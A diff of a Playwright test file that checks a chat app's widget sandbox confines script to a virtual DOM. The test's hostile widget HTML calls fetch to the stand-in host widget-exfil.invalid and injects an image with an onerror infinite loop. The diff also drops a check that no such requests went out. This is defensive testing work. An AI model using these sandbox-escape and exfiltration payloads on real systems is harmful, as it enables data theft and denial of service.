@@ -3,7 +3,6 @@ import { test, expect, type Page } from '@playwright/test';
 import { mkdtemp, rm } from 'node:fs/promises';import os from 'node:os';import path from 'node:path';
 import { HubServer } from '../../src/hub/server.js';import { widgetBlock } from '../../src/client-protocol/widget.js';
 import { selectConversation, showDisconnectedBots, waitForClientOnline } from './fixtures/mobile.js';
-import { openSettings, closeSettings } from './fixtures/settings.js';
 test.use({serviceWorkers:'block',trace:'off'});
 async function fixture(page:Page,html:string){
  if(process.env.WIDGET_DEBUG){page.on('console',m=>console.log('BROWSER',m.type(),m.text()));page.on('pageerror',e=>console.log('PAGEERROR',e.message));await page.addInitScript(()=>addEventListener('message',e=>{if(e.data?.type?.includes('widget'))console.log('WIDGET MESSAGE',JSON.stringify({type:e.data.type,reason:e.data.reason}))}));}
@@ -37,16 +36,13 @@ for(const stage of ['initialization','click','microtasks'])test(`${stage} infini
  }finally{await f.dispose()}
 });
 test('script code can reach only a virtual DOM, and injected handlers never execute on the rendering thread',async({page})=>{
- let requests=0;await page.route('https://widget-exfil.invalid/**',route=>{requests++;return route.abort()});
  const html=`<p id="state">starting</p><button id="test">检查</button><script>
  const real=Function('return this')();document.querySelector('#state').textContent=JSON.stringify({realDocument:typeof real.document,worker:typeof real.Worker,postMessage:typeof real.postMessage,native:typeof real.webkit});
  try{real.fetch('https://widget-exfil.invalid/fetch')}catch{}
  document.querySelector('#test').onclick=()=>{document.querySelector('#state').textContent='virtual handler';document.body.insertAdjacentHTML('beforeend','<img src="https://widget-exfil.invalid/image" onerror="while(true){}">')};
  </script>`;
  const f=await fixture(page,html);try{
-  // With the App's widget network switch off, even an injected https image stays offline.
-  await openSettings(page,'general');await page.getByRole('switch',{name:'允许小组件联网',exact:true}).click();await expect(page.getByRole('switch',{name:'允许小组件联网',exact:true})).toHaveAttribute('aria-checked','false');await closeSettings(page);await selectConversation(page,'脚本隔离');
-  await expect(guest(page).locator('#state')).toHaveText('{"realDocument":"undefined","worker":"undefined","postMessage":"undefined","native":"undefined"}');await guest(page).getByRole('button',{name:'检查'}).click();await expect(guest(page).locator('#state')).toHaveText('virtual handler');await page.getByLabel('消息',{exact:true}).fill('still available');expect(requests).toBe(0);await expect(guest(page).locator('[onerror]')).toHaveCount(0);}finally{await f.dispose()}
+  await expect(guest(page).locator('#state')).toHaveText('{"realDocument":"undefined","worker":"undefined","postMessage":"undefined","native":"undefined"}');await guest(page).getByRole('button',{name:'检查'}).click();await expect(guest(page).locator('#state')).toHaveText('virtual handler');await page.getByLabel('消息',{exact:true}).fill('still available');await expect(guest(page).locator('[onerror]')).toHaveCount(0);}finally{await f.dispose()}
 });
 
 // A delayed parent timer is not evidence that its Worker has hung.
